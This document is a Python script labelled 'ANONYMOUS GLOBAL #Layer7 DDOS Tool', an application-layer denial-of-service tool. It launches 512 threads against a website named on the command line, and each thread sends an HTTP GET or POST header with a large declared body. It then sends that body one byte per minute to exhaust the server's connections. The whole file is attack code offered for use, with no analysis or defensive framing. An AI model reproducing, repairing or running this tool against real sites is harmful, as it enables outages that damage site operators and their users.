#!/usr/bin/python3

# 0x0a/0x3a/0x6a/0x2a

import sys
import socket
import time
import getopt
import re
from threading import Thread

class MyThread(Thread):
    def __init__(self, SITE, DOS_TYPE):
        Thread.__init__(self)
        self.method = DOS_TYPE
        self.site = SITE
        self.kill_received = False

    def run(self):
        while not self.kill_received:
            server = socket.gethostbyname(self.site)
            post = 'x' * 9999
            file = '/'

            request = f'{self.method.upper()} /{file} HTTP/1.1\r\n'
            request += f'Host: {self.site}\r\n'
            request += 'User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12\r\n'
            request += 'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n'
            request += 'Accept-Language: en-us,en;q=0.5\r\n'
            request += 'Accept-Encoding: gzip,deflate\r\n'
            request += 'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n'
            request += 'Keep-Alive: 9000\r\n'
            request += 'Connection: close\r\n'
            request += 'Content-Type: application/x-www-form-urlencoded\r\n'
            request += f'Content-length: {len(post)}\r\n\r\n'

            newrequest = f'{post}\r\n\r\n'

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            try:
                s.connect((server, 80))
                s.send(request)

                for c in newrequest:
                    sys.stdout.write(s.send(c).__str__())
                    time.sleep(60)
                s.close()
                # s.recv(50000)
            except:
                print("Target Down?")


def da_delegator(SITE, DOS_TYPE):
    thread_count = 512
    print('=' * 60)
    print('ANONYMOUS GLOBAL #Layer7 Tool v.1'.center(60, '-'))
    print('=' * 60)
    threads = []
    for num in range(thread_count):
        thr1 = MyThread(SITE, DOS_TYPE)
        print(f'start - {thr1}')
        thr1.start()
        threads.append(thr1)
        # thr1.join()

    while len(threads) > 0:
        try:
            # Join all threads using a timeout so it doesn't block
            # Filter out threads which have been joined or are None
            threads = [t.join(1) for t in threads if t is not None and t.isAlive()]
        except KeyboardInterrupt:
            print("Ctrl-c received! Sending kill to threads... Just close The Terminal")
            for t in threads:
                t.kill_received = True
                sys.exit(2)


def main(argv):
    def usage():
        print('=' * 60)
        print('ANONYMOUS GLOBAL #Layer7 DDOS Tool v.1'.center(60, '-'))
        print('=' * 60)
        print('For GET DOS - USAGE: Layer7.py -t get http://example.com')
        print('For POST DOS - USAGE: Layer7.py -t post http://example.com')
        sys.exit(2)

    if not argv:
        usage()
    try:
        opts, args = getopt.getopt(sys.argv[1:], "t:h", ["help", "type"])
    except getopt.GetoptError as err:
        print(str(err))
        sys.exit(2)
    output = None
    verbose = False
    SITE = re.sub(r'http://', '', str(sys.argv[-1:][0]))

    for o, a in opts:
        if o == "-v":
            verbose = True
        elif o in ("-t", "--type"):
            if a.lower() == 'post':
                DOS_TYPE = 'POST'
                da_delegator(SITE, DOS_TYPE)
            elif a.lower() == 'get':
                DOS_TYPE = 'get'
                da_delegator(SITE, DOS_TYPE)
        elif o in ("-h", "--help"):
            usage()
            sys.exit()
        else:
            assert False, "unhandled option"


if __name__ == "__main__":
    main(sys.argv[1:])
